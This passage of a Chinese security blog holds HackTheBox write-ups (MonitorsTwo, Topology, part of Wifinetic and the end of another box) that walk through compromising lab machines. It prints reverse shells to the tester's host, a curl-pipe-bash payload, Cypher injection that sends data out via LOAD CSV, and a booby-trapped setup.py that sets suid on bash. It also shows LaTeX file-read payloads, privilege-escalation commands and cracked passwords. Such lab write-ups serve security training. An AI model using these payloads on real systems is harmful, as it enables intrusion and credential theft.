	result <span class="token operator">=</span> run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"dig txt </span><span class="token interpolation"><span class="token punctuation">{</span>domain<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>
	output <span class="token operator">=</span> result<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>原因：</p>
<p>1.因为<code>re.match()</code>是从头开始匹配；</p>
<p>2.且此if条件的正则没有指定匹配结尾的元字符”$”；</p>
<p>3.从而导致只要字符串前半部分有符合邮箱规则的子串，就匹配成功，执行else；</p>
<p>4.那么email是<code>wa0er@htb.com;curl 127.0.0.1</code>，就会导致domain拼接到dig命令时变成如下，从而执行命令</p>
<pre class="line-numbers language-none"><code class="language-none">dig txt htb.com;curl 127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>修补思路：</p>
<pre class="line-numbers language-none"><code class="language-none">1.更换re.match()为re.fullmatch()
re.fullmatch("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(.[A-Z|a-z]{2,})", email)

2.正则添加匹配结尾的元字符"$"
re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})$", email)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看刚才的<code>app.py</code>，form模块的sendmessage方法在16行被调用，也就是在根目录路由被调用，对比代码中接收的POST参数（email, subject, message），在首页顶部菜单栏对应Contact功能点</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829140523613.png"></p>
<p>随便填，抓包</p>
<p>由于会连续执行两个命令（dig和自己的），第二个命令执行结果看不到，所以通过访问本地http服务来测试。需要先本地开启http服务，然后请求包修改如下发送</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829140728113.png"></p>
<p>查看http服务，成功接收到访问请求</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829140747406.png"></p>
<p>于是反弹shell</p>
<p>本地两个终端窗口，一个开启http服务，一个开启监听</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80
nc -lvnp 9898<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>本地新建一个<code>shell.sh</code>文件，内容如下</p>
<pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/10.10.14.7/9898 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后请求包payload修改如下，发送请求</p>
<pre class="line-numbers language-none"><code class="language-none">curl 10.10.14.7/shell.sh|bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829144523981.png"></p>
<p>反弹shell成功，获取www-data权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829145053718.png"></p>
<h2 id="五、端口转发"><a href="#五、端口转发" class="headerlink" title="五、端口转发"></a>五、端口转发</h2><p>然后查看端口服务</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829150222348.png"></p>
<p>80（http）、53（dns）、22（ssh）、3306（mysql）、33060（mysql）都是常规端口</p>
<p>7474、7687分别是neo4j数据库服务的http端口和bolt连接器端口</p>
<p>3000、8001非常规端口，应该有web服务，尝试端口转发把流量代理出来</p>
<p>目标靶机执行如下命令从本地下载chisel（笔者此处下载到<code>/tmp</code>目录）</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://10.10.14.7/chisel
chmod +x chisel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>本地kali执行如下命令，开启服务端监听</p>
<pre class="line-numbers language-none"><code class="language-none">./chisel server -p 9899 -reverse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>目标靶机执行如下命令，实现端口转发</p>
<pre class="line-numbers language-none"><code class="language-none">./chisel client 10.10.14.7:9899 R:3000:127.0.0.1:3000 R:8001:127.0.0.1:8001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>本地kali显示如下，连接建立成功</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829151614436.png"></p>
<p>3000端口，看样子是个git仓库托管服务</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829152048103.png" style="zoom: 67%;">

<p>8001端口</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829152116286.png" style="zoom:67%;">

<p>弱口令<code>admin: admin</code>登录成功，下拉发现数据库正是neo4j</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829152536267.png"></p>
<h2 id="六、Neo4j注入"><a href="#六、Neo4j注入" class="headerlink" title="六、Neo4j注入"></a>六、Neo4j注入</h2><p>参考：<a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j">https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j</a></p>
<p>neo4j原理参考：<a href="https://www.w3cschool.cn/neo4j/neo4j_building_blocks.html">https://www.w3cschool.cn/neo4j/neo4j_building_blocks.html</a></p>
<p>页面左侧菜单栏<code>EMPLOYEES</code>选项中有个输入框，输入如下payload，获取服务版本</p>
<pre class="line-numbers language-none"><code class="language-none">' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.7/?version=' + version + '&amp;name=' + name + '&amp;edition=' + edition as l RETURN 0 as _0 //<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>本地http服务可看到回显得到neo4j的服务版本信息</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829154348639.png"></p>
<p>在输入框输入，通过burp传参的话需要经过URL编码且空格需用加号替换</p>
<p>获取label，得到user和employee两个label</p>
<pre class="line-numbers language-none"><code class="language-none">' OR 1=1 WITH 1 as a  CALL db.labels() yield label LOAD CSV FROM 'http://10.10.14.7/?label='+label as l RETURN 0 as _0 //<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829160213326.png"></p>
<p>获取user的properties of a key，得到admin和john两个用户的username和password（有些英文名词怕翻译词不达意，就没用中文）</p>
<pre class="line-numbers language-none"><code class="language-none">' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.7/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829160620410.png"></p>
<p>用<a href="https://crackstation.net/%E7%A0%B4%E8%A7%A3hash%E5%80%BC%EF%BC%8C%E5%A6%82%E4%B8%8B">https://crackstation.net/破解hash值，如下</a></p>
<pre class="line-numbers language-none"><code class="language-none">8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918	admin
a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6	ThisIs4You<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ssh连接john账户</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829161029091.png"></p>
<p>执行<code>sudo -l</code>查看能以root身份执行的命令，可从3000端口服务下载后缀为<code>.tar.gz</code>的压缩包</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829161232794.png"></p>
<h2 id="七、pip-download代码执行"><a href="#七、pip-download代码执行" class="headerlink" title="七、pip download代码执行"></a>七、pip download代码执行</h2><p>google搜索关键字：pip download exploit</p>
<p><a href="https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/">https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/</a></p>
<p><a href="https://github.com/wunderwuzzi23/this_is_fine_wuzzi">https://github.com/wunderwuzzi23/this_is_fine_wuzzi</a></p>
<p>下载exploit</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/wunderwuzzi23/this_is_fine_wuzzi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>修改<code>setup.py</code>两个位置，如下图</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829170231511.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> setuptools <span class="token keyword">import</span> setup<span class="token punctuation">,</span> find_packages
<span class="token keyword">from</span> setuptools<span class="token punctuation">.</span>command<span class="token punctuation">.</span>install <span class="token keyword">import</span> install
<span class="token keyword">from</span> setuptools<span class="token punctuation">.</span>command<span class="token punctuation">.</span>egg_info <span class="token keyword">import</span> egg_info
<span class="token keyword">import</span> os

<span class="token keyword">def</span> <span class="token function">RunCommand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"chmod u+s /bin/bash"</span><span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">RunEggInfoCommand</span><span class="token punctuation">(</span>egg_info<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        RunCommand<span class="token punctuation">(</span><span class="token punctuation">)</span>
        egg_info<span class="token punctuation">.</span>run<span class="token punctuation">(</span>self<span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">RunInstallCommand</span><span class="token punctuation">(</span>install<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        RunCommand<span class="token punctuation">(</span><span class="token punctuation">)</span>
        install<span class="token punctuation">.</span>run<span class="token punctuation">(</span>self<span class="token punctuation">)</span>

setup<span class="token punctuation">(</span>
    name <span class="token operator">=</span> <span class="token string">"this_is_fine_wuzzi"</span><span class="token punctuation">,</span>
    version <span class="token operator">=</span> <span class="token string">"0.0.1"</span><span class="token punctuation">,</span>
    license <span class="token operator">=</span> <span class="token string">"MIT"</span><span class="token punctuation">,</span>
    packages<span class="token operator">=</span>find_packages<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    cmdclass<span class="token operator">=</span><span class="token punctuation">{</span>
        <span class="token string">'install'</span> <span class="token punctuation">:</span> RunInstallCommand<span class="token punctuation">,</span>
        <span class="token string">'egg_info'</span><span class="token punctuation">:</span> RunEggInfoCommand
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>用如下命令在<code>this_is_fine_wuzzi</code>目录下构建python发布包，笔者此处在virtualenv（python3.8.10虚拟环境）下build，因为正常build会报错</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829170416474.png"></p>
<p>build完成后会在当前目录生成dist目录，里面有个<code>.tar.gz</code>文件</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829171107436.png"></p>
<p>用<code>john</code>的账户密码<code>ThisIs4You</code>登录3000端口web端</p>
<p>右上角加号新建仓库，配置如下</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829174954941.png" style="zoom:67%;">

<p>新建仓库成功后进入如下界面，点击<code>Upload File</code>上传文件</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829175148157.png"></p>
<p>上传刚刚生成的<code>.tar.gz</code>文件</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829175308815.png" style="zoom:67%;">

<p>上传成功如下</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829175331963.png" style="zoom:67%;">

<p>然后在目标靶机执行如下命令，可看到<code>/bin/bash</code>已经有了suid权限</p>
<pre class="line-numbers language-none"><code class="language-none">sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/wa0er/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829183729776.png"></p>
<p>执行<code>bash -p</code>提权，成功获取root权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829183811688.png"></p>
<p>Over！</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829200718553.png" style="zoom: 80%;">]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>LFI</tag>
        <tag>Nginx</tag>
        <tag>Neo4j注入</tag>
        <tag>pip download代码执行</tag>
        <tag>python代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-MonitorsTwo</title>
    <url>/posts/1ca70420.html</url>
    <content><![CDATA[<h1 id="HTB-MonitorsTwo"><a href="#HTB-MonitorsTwo" class="headerlink" title="HTB-MonitorsTwo"></a>HTB-MonitorsTwo</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><p>1.信息收集发现<code>Cacti</code>框架存在CVE-2022-46169命令注入漏洞；</p>
<p>2.CVE-2022-46169命令注入获取www-data权限；</p>
<p>3.发现mysql数据库和带suid的文件capsh；</p>
<p>4.capsh提权到root（此root非彼root）；</p>
<p>5.数据库查询发现ssh用户；</p>
<p>6.ssh用户连接上去，发现邮件，存在docker漏洞CVE-2021-41091；</p>
<p>7.docker漏洞提权到root。</p>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>nmap扫描端口服务</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904091321625.png"></p>
<p>80端口开放，那么访问web端</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904091526144.png" style="zoom:80%;">

<h2 id="三、CVE-2022-46169（Cacti命令注入漏洞）"><a href="#三、CVE-2022-46169（Cacti命令注入漏洞）" class="headerlink" title="三、CVE-2022-46169（Cacti命令注入漏洞）"></a>三、CVE-2022-46169（Cacti命令注入漏洞）</h2><p>google关键字Cacti exploit</p>
<p>找到是CVE-2022-46169</p>
<p>exploit：<a href="https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22">https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22</a></p>
<p>本地开启监听，并执行exp</p>
<pre class="line-numbers language-none"><code class="language-none">nc -lvnp 9898
python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.14.4 --LPORT=9898<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904091954548.png"></p>
<p>获取www-data权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904092027843.png"></p>
<p>在<code>/var/www/html/</code>下发现数据库文件<code>cacti.sql</code>，看到有admin用户密码，但实际无法登录主页</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904164948097.png"></p>
<p>根目录有<code>entrypoint.sh</code>，可看到是mysql数据库，有一些数据库命令</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904170007786.png"></p>
<p>执行如下命令，查找有suid权限的文件，看到/sbin/capsh，比较罕见</p>
<pre class="line-numbers language-none"><code class="language-none">find / -perm -u=s -type f 2&gt;/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904161452855.png"></p>
<p>在shell命令提权手册里找到提权用法如下</p>
<p><a href="https://gtfobins.github.io/gtfobins/capsh/#suid">https://gtfobins.github.io/gtfobins/capsh/#suid</a></p>
<pre class="line-numbers language-none"><code class="language-none">/sbin/capsh --gid=0 --uid=0 --<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904161559695.png"></p>
<p>提权到了root，但是此root非彼root</p>
<p>看到上面有mysql命令，而且admin和guest用户都在user_auth表里，那么执行如下命令</p>
<pre class="line-numbers language-none"><code class="language-none">mysql --host=db --user=root --password=root cacti -e "SELECT * FROM user_auth"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904172320625.png"></p>
<p>发现有另一个用户marcus，密码是hash存储，那就用john爆破一下</p>
<p>将hash保存到新文件hash里，执行如下命令，得到密码</p>
<pre class="line-numbers language-none"><code class="language-none">john --wordlist=/usr/share/wordlists/rockyou.txt hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904172709440.png"></p>
<pre class="line-numbers language-none"><code class="language-none">marcus:funkymonkey<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ssh连接</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904173047965.png"></p>
<p>从本地下载linpeas</p>
<p>本地kali执行</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>目标靶机执行</p>
<pre class="line-numbers language-none"><code class="language-none">cd /tmp
wget http://10.10.14.4/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现有邮件</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904175615061.png"></p>
<p>查看邮件</p>
<pre class="line-numbers language-none"><code class="language-none">cat /var/mail/marcus<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904174620615.png"></p>
<h2 id="四、CVE-2021-41091（docker目录遍历-amp-命令执行）"><a href="#四、CVE-2021-41091（docker目录遍历-amp-命令执行）" class="headerlink" title="四、CVE-2021-41091（docker目录遍历&amp;命令执行）"></a>四、CVE-2021-41091（docker目录遍历&amp;命令执行）</h2><p>可看到有三个CVE，依次google查找利用方式，找到如下exploit，是docker容器的漏洞</p>
<p><a href="https://github.com/UncleJ4ck/CVE-2021-41091">https://github.com/UncleJ4ck/CVE-2021-41091</a></p>
<p>大致原理是，因为权限控制不当，当docker容器内存在带有suid的程序，我们可以在主机遍历到这个docker容器的目录，然后执行这些带suid的程序，相当于也在主机中执行了这些带suid的程序</p>
<p>需要先在之前的root窗口给<code>/bin/bash</code>添加suid权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904185713153.png"></p>
<p>然后将exploit下载到本地，然后在目标靶机从本地下载exp.sh，执行如下命令</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://10.10.14.4/exp.sh
chmod +x exp.sh
./exp.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>再进入到容器目录（在执行结果的Current Vulnerable Path处），执行<code>./bin/bash -p</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904185837017.png"></p>
<p>成功获取root权限</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230904185905491.png" style="zoom: 67%;">]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>mysql数据库</tag>
        <tag>CVE-2022-46169（Cacti框架命令注入）</tag>
        <tag>CVE-2021-41091（docker提权）</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Topology</title>
    <url>/posts/e1e0c79d.html</url>
    <content><![CDATA[<h1 id="HTB-Topology"><a href="#HTB-Topology" class="headerlink" title="HTB-Topology"></a>HTB-Topology</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><p>1.信息收集发现LaTeX公式生成器；</p>
<p>2.LaTeX公式生成器任意文件读取Apache的<code>.htpasswd</code>文件获取SSH账户；</p>
<p>3.SSH连接执行pspy64发现定时任务反弹shell获取root权限。</p>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>nmap扫描端口服务</p>
<pre class="line-numbers language-none"><code class="language-none">nmap -A 10.10.11.217<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911154643078.png"></p>
<p>80端口开放，直接访问</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911154746560.png" style="zoom: 67%;">

<p>首页看到有一个LaTeX表达式的超链接</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911161807906.png"></p>
<p>发现子域，添加进本地hosts文件</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.217 latex.topology.htb topology.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="三、latex实现任意文件读取"><a href="#三、latex实现任意文件读取" class="headerlink" title="三、latex实现任意文件读取"></a>三、latex实现任意文件读取</h2><p>google关键词：latex exploit</p>
<p><a href="https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection">https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection</a></p>
<p>经过尝试，最终payload如下，读取<code>/etc/passwd</code>文件</p>
<pre class="line-numbers language-none"><code class="language-none">$\lstinputlisting{/etc/passwd}$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911164845923.png" style="zoom: 80%;">

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911165033672.png" style="zoom:80%;">

<p>发现另一个用户<code>vdaisley</code>，但是没有口令，扫描子域发现<code>stats</code>和<code>dev</code>子域，都添加到本地hosts文件后，<code>stats</code>子域打开是一张图片，<code>dev</code>子域需要认证</p>
<pre class="line-numbers language-none"><code class="language-none">gobuster vhost -u http://topology.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911163525918.png"></p>
<p>既然<code>dev</code>子域需要认证，而且通常在Apache服务器中会使用<code>.htpasswd</code>文件存储密码文件，那么<code>vdaisley</code>的口令也极有可能存储在<code>dev</code>子域的<code>.htpasswd</code>文件中，又因为此文件通常位于网站根目录，所以可以用如下payload尝试读取<code>/var/www/dev/.htpasswd</code>文件</p>
<pre class="line-numbers language-none"><code class="language-none">$\lstinputlisting{/var/www/dev/.htpasswd}$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911171201018.png"></p>
<pre class="line-numbers language-none"><code class="language-none">vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>把hash值写入文件hash，用john爆破</p>
<pre class="line-numbers language-none"><code class="language-none">john --wordlist=/usr/share/wordlists/rockyou.txt hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911172715197.png"></p>
<pre class="line-numbers language-none"><code class="language-none">vdaisley:calculus20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>SSH连接</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911173302757.png"></p>
<h2 id="四、pspy64发现定时任务反弹shell"><a href="#四、pspy64发现定时任务反弹shell" class="headerlink" title="四、pspy64发现定时任务反弹shell"></a>四、pspy64发现定时任务反弹shell</h2><p>本地kali开启http服务</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>目标靶机从本地下载pspy64</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://10.10.14.8/pspy64
chmod +x pspy64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>执行，发现定时任务如下，可通过在/opt/gnuplot目录下新建后缀为<code>.plt</code>的文件，并在文件中写入恶意命令，通过定时任务的<code>/bin/sh -c</code>间接执行</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911180257966.png"></p>
<p>新建文件<code>/opt/gnuplot/shell.plt</code>，内容如下</p>
<pre class="line-numbers language-none"><code class="language-none">system "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.8/9898 0&gt;&amp;1'"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>本地kali开启监听</p>
<pre class="line-numbers language-none"><code class="language-none">nc -lvnp 9898<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>稍等片刻，成功获取root权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911181002456.png"></p>
<p>Over！</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911181258210.png" style="zoom:67%;">]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>LaTeX公式</tag>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Wifinetic</title>
    <url>/posts/e48c1386.html</url>
    <content><![CDATA[<h1 id="HTB-Wifinetic"><a href="#HTB-Wifinetic" class="headerlink" title="HTB-Wifinetic"></a>HTB-Wifinetic</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><p>信息泄露、无线网络相关知识</p>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922090938331.png" style="zoom:80%;">

<p>FTP</p>
<pre class="line-numbers language-none"><code class="language-none">ftp 10.10.11.247  #会提示This FTP server is anonymous only，所以登录anonymous用户
promot	#关闭交互模式，不关的话下载每个文件都会询问
mget *	#下载所有文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922095011089.png" style="zoom:80%;">

<p><code>MigrateOpenWrt.txt</code>有如下内容，提示<code>Reaver</code>工具可以测试安全问题，这里也可以知道是Wifi环境</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922112249162.png" style="zoom:80%;">

<p><code>ProjectGreatMigration.pdf</code>有邮箱和域名</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922112648529.png" style="zoom:80%;">

<p>解压tar压缩包</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922135058358.png" style="zoom:80%;">

<p>在<code>./etc/config/wireless</code>找到了一个疑似口令</p>
<pre class="line-numbers language-none"><code class="language-none">VeRyUniUqWiFIPasswrd1!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922140018753.png" style="zoom:80%;">

<p>在<code>./etc/passwd</code>发现一个非常规用户</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922140123110.png"></p>
<p>尝试连接ssh服务，成功连接</p>
<pre class="line-numbers language-none"><code class="language-none">ssh netadmin@10.10.11.247<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922140345956.png"></p>
<h2 id="三、提权"><a href="#三、提权" class="headerlink" title="三、提权"></a>三、提权</h2><p>无线网络，最主要的就是弄清楚无线AP（Access Point）是谁</p>
<p>执行<code>ifconfig</code>查看<code>wlan0</code>和<code>wlan1</code>分配了IP，常规AP的IP一般都是<code>192.168.1.1</code>、<code>192.168.0.1</code>，暂且猜测<code>wlan0</code>是AP</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922162619994.png"></p>
<p>查看<code>wpa_supplicant</code>服务状态，最后一行命令可看出<code>wlan1</code>是wifi客户端，排除法基本确定<code>wlan0</code>是AP</p>
<blockquote>
